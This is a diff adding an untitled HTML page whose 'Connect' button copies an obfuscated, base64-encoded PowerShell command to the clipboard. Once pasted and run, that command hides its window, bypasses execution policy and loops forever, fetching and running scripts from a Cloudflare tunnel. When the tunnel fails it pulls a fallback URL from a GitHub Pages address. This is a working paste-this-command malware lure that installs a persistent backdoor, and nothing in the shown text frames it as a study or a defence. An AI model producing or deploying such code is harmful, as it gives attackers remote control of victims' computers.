@@ -1,1 +1,32 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+</head>
+<body>
+  <button onclick="c()">Connect</button>
+  <script>
+    function e(s) {
+      const b = [];
+      for (let i = 0; i < s.length; i++) {
+        const c = s.charCodeAt(i);
+        b.push(c & 0xFF);
+        b.push((c >> 8) & 0xFF);
+      }
+      let x = '';
+      for (let i = 0; i < b.length; i++) {
+        x += String.fromCharCode(b[i]);
+      }
+      return btoa(x);
+    }
+    function c() {
+      const tunnelUrl = "https://yesterday-developers-mirrors-threshold.trycloudflare.com";
+      const p = "$g=New-Object Net.WebClient;$g.Headers.Add('User-Agent','PowerShell');$lastContent='';$tunnelUrl='" + tunnelUrl + "';$gh='https://aeclz.github.io/i.html';while($true){try{$url=$tunnelUrl+'/h.ps1?t='+[DateTime]::Now.Ticks;$c=$g.DownloadString($url);if($c -match '<html'){throw 'Cloudflare Error'}if($c -ne $lastContent){$lastContent=$c;$t=[IO.Path]::GetTempFileName()+'.ps1';[IO.File]::WriteAllText($t,$c,[Text.Encoding]::UTF8);Start-Process powershell -ArgumentList '-NoP','-NonI','-Exec','Bypass','-File',$t -WindowStyle Hidden}}catch{try{$res=$g.DownloadString($gh+'?t='+[DateTime]::Now.Ticks);if($res -match '(https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com)'){$tunnelUrl=$matches[1]}}catch{}};Start-Sleep 1}";
+      const z = e(p);
+      const cmd = "powershell -w h -NoP -NonI -Exec Bypass -Enc " + z;
+      navigator.clipboard.writeText(cmd).then(function() { alert("Copied"); }).catch(function() { prompt("Copy:", cmd); });
+    }
+  </script>
+</body>
+</html>
